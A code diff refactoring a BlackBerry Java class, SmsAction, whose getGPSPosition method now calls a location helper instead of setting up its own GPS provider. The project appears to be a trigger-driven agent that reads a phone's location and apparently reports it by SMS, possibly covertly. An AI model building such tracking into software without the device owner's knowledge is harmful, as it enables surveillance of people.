@@ -8,9 +8,7 @@
  * *************************************************/
 package blackberry.action;
 
-import javax.microedition.location.Criteria;
 import javax.microedition.location.Location;
-import javax.microedition.location.LocationProvider;
 import javax.microedition.location.QualifiedCoordinates;
 
 import net.rim.device.api.system.CDMAInfo;
@@ -19,6 +17,7 @@ import net.rim.device.api.system.GPRSInfo;
 import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
 import net.rim.device.api.util.NumberUtilities;
 import blackberry.Device;
+import blackberry.SMSHelper;
 import blackberry.Trigger;
 import blackberry.config.ConfAction;
 import blackberry.config.ConfigurationException;
@@ -26,7 +25,6 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.location.LocationHelper;
 import blackberry.location.LocationObserver;
-import blackberry.sms.SMSHelper;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
 
@@ -151,29 +149,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
 
     private boolean getGPSPosition() {
 
-        LocationProvider lp = null;
-        final Criteria criteria = new Criteria();
-        criteria.setCostAllowed(true);
-
-        criteria.setHorizontalAccuracy(50);
-        criteria.setVerticalAccuracy(50);
-        criteria.setPreferredPowerConsumption(Criteria.POWER_USAGE_HIGH);
-
-        try {
-            lp = LocationProvider.getInstance(criteria);
-        } catch (final Exception e) {
-            //#ifdef DEBUG
-            debug.error(e);
-            //#endif
-            return false;
-        }
-
-        if (lp == null) {
-            //#ifdef DEBUG
-            debug.error("GPS Not Supported on Device");
-            //#endif               
-            return false;
-        }
+      
 
         if (waitingForPoint) {
             //#ifdef DEBUG
@@ -183,7 +159,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
         }
 
         synchronized (this) {
-            LocationHelper.getInstance().locationGPS(lp, this, true);
+            LocationHelper.getInstance().start( this, true);
         }
 
         return true;
